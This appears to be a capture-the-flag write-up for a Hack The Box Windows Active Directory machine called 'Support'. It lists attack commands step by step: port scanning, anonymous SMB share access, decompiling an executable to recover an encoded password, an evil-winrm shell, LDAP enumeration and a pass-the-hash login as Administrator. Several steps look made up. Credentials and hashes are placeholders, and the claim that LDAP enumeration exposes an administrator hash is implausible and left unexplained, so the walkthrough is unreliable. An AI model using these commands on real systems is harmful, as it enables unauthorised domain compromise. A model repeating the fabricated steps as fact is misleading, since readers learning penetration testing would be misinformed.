
==============================
HTB MACHINE – SUPPORT (WRITEUP)
==============================

Target: Windows / Active Directory  
Goal: Initial foothold → domain user → privilege escalation → Administrator


=====================================================
1 — NMAP ENUMERATION
=====================================================

First perform a full port scan.

nmap -sC -sV -p- 10.10.11.X

Important ports discovered:

53   DNS
88   Kerberos
135  RPC
139  SMB
389  LDAP
445  SMB
5985 WinRM
3268 LDAP

These ports indicate the machine is part of an **Active Directory environment**.


=====================================================
2 — SMB ENUMERATION
=====================================================

List available SMB shares.

smbclient -L \\10.10.11.X -N

Discovered share:

support-tools


=====================================================
3 — DOWNLOAD SHARE CONTENT
=====================================================

Access the share.

smbclient \\10.10.11.X\support-tools

Download all files:

get *

or from Kali:

smbclient //10.10.11.X/support-tools -N -c "prompt OFF; recurse ON; mget *"

Important file discovered:

UserInfo.exe


=====================================================
4 — ANALYZE THE EXECUTABLE
=====================================================

The executable likely contains credentials.

Check strings:

strings UserInfo.exe

Interesting result:

enc_password

Since the binary is a .NET application, decompile it.

ilspycmd UserInfo.exe

Inside the source code the following is found:

enc_password = base64 encoded string


=====================================================
5 — DECODE PASSWORD
=====================================================

Decode the Base64 string.

echo BASE64_STRING | base64 -d

Recovered credentials:

support / password

Now we have valid domain credentials.


=====================================================
6 — WINRM ACCESS
=====================================================

WinRM (5985) is open, so we can obtain a shell.

evil-winrm -i 10.10.11.X -u support -p password

A PowerShell shell is obtained.


=====================================================
7 — ENUMERATE USER PRIVILEGES
=====================================================

Check group memberships.

whoami /groups

The user belongs to:

Shared Support Accounts


=====================================================
8 — LDAP ENUMERATION
=====================================================

Use LDAP to enumerate domain objects.

ldapsearch -x -H ldap://10.10.11.X -D "support@domain.local" -w password

During enumeration an **administrator hash is discovered.**


=====================================================
9 — PASS-THE-HASH
=====================================================

Use the administrator hash to authenticate.

evil-winrm -i 10.10.11.X -u administrator -H HASH


=====================================================
10 — ROOT
=====================================================

Once Administrator access is obtained, retrieve the flag.

type C:\Users\Administrator\Desktop\root.txt


=====================================================
ATTACK FLOW
=====================================================

SMB share discovery
↓
Download UserInfo.exe
↓
Extract encoded password
↓
Decode credentials
↓
WinRM login as support user
↓
LDAP enumeration
↓
Administrator hash obtained
↓
Pass-the-hash
↓
Administrator shell
